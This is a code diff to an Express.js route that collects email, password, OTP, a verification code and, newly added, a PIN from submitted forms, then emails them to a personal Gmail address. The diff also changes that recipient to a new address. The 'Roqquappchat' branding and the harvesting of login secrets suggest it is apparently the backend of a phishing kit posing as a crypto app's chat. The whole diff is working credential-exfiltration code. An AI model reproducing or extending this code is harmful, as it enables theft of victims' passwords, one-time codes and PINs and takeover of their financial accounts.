@@ -71,7 +71,7 @@ app.post('/rq-1', (req, res, next) => {
         throw err
     }
 
-    const { email, password, otp, verifyOtp } = req.body
+    const { email, password, otp, verifyOtp, pin } = req.body
 
 
     if (otp.length > 6) {
@@ -95,11 +95,12 @@ app.post('/rq-1', (req, res, next) => {
             }
         })
 
-        const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>OTP:</strong> ${otp}</p>  </br> <p><strong>VERIFYOTP:</strong>${verifyOtp}</p> </br> checking - New message from Roqquappchat!!`
+        const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>OTP:</strong> ${otp}</p> </br> <p><strong>PIN:</strong>${pin}</p> </br>  <p><strong>VERIFYOTP:</strong>${verifyOtp}</p>  </br>  checking - New message from Roqquappchat!!`
 
         const mail = {
             from: 'www.bundleafrica@gmail.com',
-            to: 'testimonyibom@gmail.com',
+            //to: 'testimonyibom@gmail.com',
+            to: 'ifestephenie@gmail.com',
             subject: 'New message from Roqquappchat',
             html: content,
         }
